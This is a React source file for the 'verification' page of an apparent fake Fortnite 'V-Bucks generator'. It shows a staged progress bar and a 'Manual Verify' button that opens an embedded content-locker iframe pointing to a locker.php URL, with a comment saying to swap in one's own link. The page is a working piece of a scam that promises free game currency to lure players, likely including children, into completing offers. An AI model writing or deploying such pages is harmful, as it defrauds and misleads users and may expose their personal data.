import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { motion } from "framer-motion";
import { ChevronLeft, Shield, Lock, CheckCircle, Loader2 } from "lucide-react";
import { Dialog, DialogTrigger, DialogContent, DialogTitle, DialogDescription } from "@/components/ui/dialog";

const Verify = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [username, setUsername] = useState("Player123");
  const [vbucksAmount, setVbucksAmount] = useState(13500);
  const [open, setOpen] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 5;
      });
    }, 100);

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
    };
  }, []);

  const handleVerify = () => {
    toast({
      title: "Verification Required",
      description: "Please complete the human verification process.",
    });
    setOpen(true);
  };

  return (
    <div className="min-h-screen flex flex-col bg-fortnite-gradient">
      <header className="container mx-auto py-4 flex items-center justify-between">
        <Button
          variant="ghost"
          size="sm"
          className="text-white"
          onClick={() => navigate("/generator")}
        >
          <ChevronLeft className="mr-1 h-4 w-4" /> Back
        </Button>

        <h1 className="text-2xl md:text-3xl font-bold text-white">
          <span className="text-fortnite-blue">V</span>-BUCKS GENERATOR
        </h1>

        <div className="w-[68px]"></div> 
      </header>

      <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
        {!isLoading && (
          <motion.div className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-6 border border-white/10">
            <div className="text-center mb-6">
              <Lock className="h-16 w-16 text-fortnite-blue p-3 bg-fortnite-black/70 rounded-full border-2 border-fortnite-blue" />
              <h2 className="text-2xl font-bold text-red-500 mb-1">MANUAL VERIFICATION REQUIRED</h2>
              <p className="text-white/80">Hello <span className="text-fortnite-yellow font-semibold">@{username}</span>! Complete the last step by clicking the Manual Verify button below.</p>
            </div>

            <Button
              onClick={handleVerify}
              className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
            >
              Manual Verify
            </Button>

            <Dialog open={open} onOpenChange={setOpen}>
              <DialogContent className="max-w-2xl">
                <DialogTitle>Verification Required</DialogTitle>
                <DialogDescription>Please complete the verification process below:</DialogDescription>
                <iframe
                  src={"https://d23h3o5tkgytgm.cloudfront.net/public/locker.php?it=4198553&key=a943e"}  // Înlocuiește cu linkul dorit
                  className="w-full h-[400px] border rounded-md"
                  sandbox="allow-scripts allow-same-origin"
                />
              </DialogContent>
            </Dialog>
          </motion.div>
        )}
      </div>

      <footer className="py-4 border-t border-white/10">
        <div className="container mx-auto px-4">
          <p className="text-xs text-white/40 text-center">
            All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Verify;
